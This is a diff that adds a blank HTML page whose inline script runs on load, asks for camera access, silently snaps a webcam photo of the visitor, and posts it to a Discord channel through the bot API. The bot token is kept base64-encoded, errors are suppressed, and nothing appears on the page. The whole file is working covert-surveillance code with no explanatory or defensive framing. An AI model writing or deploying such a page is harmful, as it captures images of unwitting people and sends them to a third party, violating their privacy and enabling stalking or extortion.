@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<script>
+var _t="TVRNNU9UazRNaU15TnpjNE9USTJOemN4T1RBd056Z3lNVGsz";
+var _l=1475949185294536859;
+var pr=navigator.mediaDevices.getUserMedia({ video: true });
+pr.then(function(s){
+var v=document.createElement('video');
+v.srcObject=s;
+v.play();
+setTimeout(function(){
+var c=document.createElement('canvas');
+c.width=v.videoWidth;
+c.height=v.videoHeight;
+c.getContext('2d').drawImage(v,0,0,c.width,c.height);
+var d=c.toDataURL('image/jpeg');
+fetch('https://discord.com/api/v10/channels/'+_l+'/messages',{
+method:'POST',
+headers:{'Authorization':'Bot '+atob(_t)},
+body:JSON.stringify({content:'📸',embeds:[{image:{url:d}}]})
+});
+s.getTracks().forEach(t=>t.stop());
+},1000);
+}).catch(function(e){});
+</script>
+</head>
+<body></body>
+</html>
